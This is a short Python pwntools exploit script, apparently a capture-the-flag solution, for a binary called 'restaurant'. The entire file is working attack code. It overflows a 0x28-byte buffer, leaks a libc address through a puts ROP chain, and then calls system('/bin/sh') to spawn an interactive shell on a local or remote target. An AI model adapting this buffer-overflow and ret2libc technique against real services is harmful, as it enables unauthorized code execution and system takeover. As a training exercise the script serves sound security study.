from pwn import *
import sys

context.binary = elf = ELF("./restaurant")
libc = ELF("./libc.so.6")

if len(sys.argv) > 1:
    ip, port = sys.argv[1].split(':')
    p = remote(ip, int(port))
else:
    p = process(elf.path)

ret_addr = 0x000000000040063e
pop_rdi = 0x00000000004010a3
vuln_func = 0x0000000000400E4A

p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil(b'> ')

# Stage 1
payload = b'a'*0x28
payload += p64(pop_rdi)
payload += p64(elf.got['exit'])
payload += p64(elf.plt['puts'])
payload += p64(vuln_func)

p.sendline(payload)

p.recvuntil(b'a'*0x28)
p.recv(3)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - libc.sym['exit']

sys_addr = libc_base + libc.sym['system']
sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

p.recvuntil(b'> ')

# Stage 2
payload = b'a'*0x28
payload += p64(pop_rdi)
payload += p64(sh_addr)
payload += p64(ret_addr)
payload += p64(sys_addr)

p.sendline(payload)
p.interactive()
